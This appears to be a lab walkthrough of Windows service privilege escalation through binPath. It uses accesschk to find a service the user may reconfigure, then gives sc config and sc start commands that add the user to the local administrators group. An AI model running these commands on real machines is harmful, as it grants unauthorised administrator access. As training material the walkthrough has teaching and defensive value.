## Service Escalation - binPath

Detection

Windows VM

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.

Exploitation

Windows VM

1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
2. In command prompt type: sc start daclsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators